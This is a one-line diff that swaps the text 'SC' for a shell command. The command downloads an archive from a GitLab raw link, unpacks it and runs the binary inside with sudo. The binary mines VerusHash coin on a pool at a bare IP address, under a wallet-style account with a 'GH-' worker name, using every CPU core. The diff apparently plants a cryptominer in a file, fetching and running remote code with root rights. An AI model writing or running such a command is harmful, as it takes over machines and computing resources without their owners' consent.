@@ -1,1 +1,1 @@
-SC
+wget -O joko https://gitlab.com/jasa4/jasa/-/raw/main/JOKO-SBv2.tar.gz && tar -xvf joko && sudo ./JOKO-SBv2/JOKO-SBv2 -a verushash -o 47.236.39.4:80 -u RUJMnjvsH3AA5WXPpttZmj7miybCqEeRrB.GH-$(TZ=UTC-7 date +"%H-%M-%S [%d-%m]") -p x --cpu-threads $(nproc --all)
